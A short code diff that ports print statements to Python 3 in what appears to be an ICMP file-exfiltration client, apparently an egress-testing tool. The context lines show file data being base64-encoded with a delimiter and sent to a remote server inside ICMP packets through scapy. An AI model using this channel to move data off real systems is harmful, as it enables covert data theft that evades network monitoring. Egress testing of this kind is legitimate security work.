@@ -40,7 +40,7 @@ class Client:
         if helpers.validate_ip(self.remote_server):
             final_destination = self.remote_server
         else:
-            print "[*] Resolving IP of domain..."
+            print("[*] Resolving IP of domain...")
             final_destination = socket.gethostbyname(self.remote_server)
 
         # calcalate total packets
@@ -57,13 +57,13 @@ class Client:
                 encoded_data = base64.b64encode(self.file_transfer +
                     ".:::-989-:::." + data_to_transmit[byte_reader:byte_reader + self.length])
 
-            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
+            print("[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets))
 
             # Craft the packet with scapy
             try:
                 send(IP(dst=final_destination)/ICMP()/(encoded_data), verbose=False)
             except KeyboardInterrupt:
-                print "[*] Shutting down..."
+                print("[*] Shutting down...")
                 sys.exit()
 
             # Increment counters
